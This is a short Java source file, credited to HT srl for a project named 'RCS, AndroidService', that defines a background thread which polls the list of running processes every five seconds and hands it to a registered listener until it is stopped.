/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import com.android.service.RunningProcesses;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class BroadcastMonitorProcess extends Thread {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorProcess";

	private boolean stop;
	private final int period;
	RunningProcesses runningProcess;

	private ListenerProcess listenerProcess;

	public BroadcastMonitorProcess() {
		stop = false;
		period = 5000; // Poll interval
		runningProcess = new RunningProcesses();
	}

	@Override
	synchronized public void run() {
		do {
			if (stop) {
				return;
			}

			runningProcess.update();
			listenerProcess.dispatch(runningProcess);

			try {
				wait(period);
			} catch (final InterruptedException e) {
				if (Cfg.DEBUG) {
					Check.log(e);
				}
			}
		} while (true);
	}

	void register(ListenerProcess listenerProcess) {
		stop = false;
		this.listenerProcess = listenerProcess;
	}

	synchronized void unregister() {
		stop = true;
		notify();
	}
}
